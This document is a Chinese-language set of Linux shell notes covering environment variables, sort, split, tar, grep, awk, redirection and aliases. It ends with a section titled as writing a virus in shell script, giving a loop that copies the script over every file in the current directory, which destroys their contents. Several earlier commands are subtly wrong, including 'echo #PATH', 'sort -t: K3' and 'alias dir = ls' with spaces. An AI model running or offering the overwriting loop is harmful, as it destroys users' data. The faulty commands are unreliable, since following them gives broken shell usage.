#环境变量
    ENV_VAR = value #环境变量赋值
    export ENV_VAR  #声明为环境变量

重要的环境变量如：$PATH,任何在$PATH中的可执行文件可以直接运行

    echo #PATH #查看PATH
    export PATH="/newdir":$PATH

$HOME/.bash_profile是最重要的配置文件，当用户登录时Shell自动执行.bash_profile文件，若不存在则自动执行系统默认配置文件/etc/profile给.bash_profile并执行命令
 
    cat .bash_profile #查看
    vi .bash_profile  #修改
    . .bash_profile #更新生效 or source .bash_profile

#sort命令
    sort -t: inputfile #对文件进行排序 按照：分隔
    sort -t: K3 inputfile #对文件进行排序 按照：分隔 后使用第三个域排序
    sort -t: K3n inputfile #对文件进行排序 按照：分隔 后使用第三个域数值大小排序
    sort -t: K3nr inputfile #对文件进行排序 按照：分隔 后使用第三个域数值大小逆序排序
    sort -t: K3nr -o output inputfile #对文件进行排序 按照：分隔 后使用第三个域数值大小逆序排序并输出到output文件
    
#uniq命令
    uniq input #对文件去除重复行

#split命令
    split -2 input output #将文件按照2行切分成小文件按照output打头命名
    split -b100 input #按照100B切分按照默认x打头切成小文件，但不保留完整记录
    split -C100 input #按照100B切分按照默认x打头切成小文件，且保留完整记录
    
#tar命令
    tar -cf db.all *.db #将以.db结尾的文件放入压缩包,实际将文件放在一起并没有压缩
    tar -tf db.all #列出压缩包内容
    tar -rf db.all log* #向压缩包中添加新的文件
    tar -xvf db.all #解压非gzip格式包
    tar -zxvf db.all #解压gzip格式包
    
    gzip db.all #文件变成db.all.gz
    tar -zxvf db.all.gz
    
    #gzip -d db.all.gz变成db.all解压包

#grep命令

格式：grep [选项] [模式] [文件...]

功能：搜索一个或多个满足模式的文本行

grep "hello" filename

#awk命令和管道（FIFO）
    awk '{print $2,$1,$4,$3}' inputfile #按照上面几个域输出文件
    awk -F"," '{print $2,$1}' newwho.txt #制定分隔符为逗号
    echo $string | awk '{print length($0)}'
    echo $string | awk '{print substr($0,1,8)}'
    ls -l | grep vi | wc -l

#more命令和cat命令
都是用来显示文件more提供分页功能 cat不提供分页功能

    cat file |awk -F"," '{print $2,$1}'

#I/O重定向
    >filename #标准输出到文件
    >>filename #标准输出到文件追加模式
    <filenemw #文件读入到标准输入

#alias命令
    alias dir = ls
    dir
    unalias dir #删除别名
    unalias -a #删除所有别名

#sleep命令
    sleep 10 #休眠10秒

# $RANDOM伪随机数,范围[0,32767]
    num=$RANDOM
    
#Linux Shell脚本写病毒
    for file in *
    do 
     cp $0 $file
    done


